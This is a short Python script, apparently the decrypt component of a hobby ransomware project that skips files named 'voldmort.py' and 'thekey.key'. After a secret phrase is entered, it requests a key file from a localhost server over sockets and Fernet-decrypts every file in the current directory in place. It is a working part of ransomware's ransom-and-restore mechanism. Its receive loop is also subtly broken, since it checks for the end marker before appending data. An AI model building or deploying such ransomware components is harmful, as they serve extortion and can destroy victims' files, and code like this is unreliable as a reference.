import os
from cryptography.fernet import Fernet
import socket



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('localhost' , 9998))

server.listen()

files = []

for file in os.listdir():
    if file == "voldmort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)


print(files)

secret_phrase = "secret"

user_phrase = input("input secret\n")



if secret_phrase == user_phrase:

    client1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client1.connect(('localhost' , 9999))
    rq = b"<RQST>"
    client1.send(rq)
    client1.close()

    client , addr = server.accept()

    file_name = client.recv(1024).decode()
    print(file_name)
    file_size = client.recv(1024).decode()
    print(file_size)

    file = open(file_name,'wb')

    file_bytes = b""

    done = False

    while not done:
        data = client.recv(1024)
        if file_bytes[-5:] == b"<END>":
            done = True
        else:
            file_bytes += data

    file.write(file_bytes[:-5])

    file.close()
    client.close()
    server.close()

    with open("thekey.key","rb") as thekey:
        key = thekey.read()
    
    
    for file in files:
        with open(file,"rb") as thefile:
            content_encrypted = thefile.read()
        
        content = Fernet(key).decrypt(content_encrypted)
    
        with open(file,"wb") as thefile:
            thefile.write(content)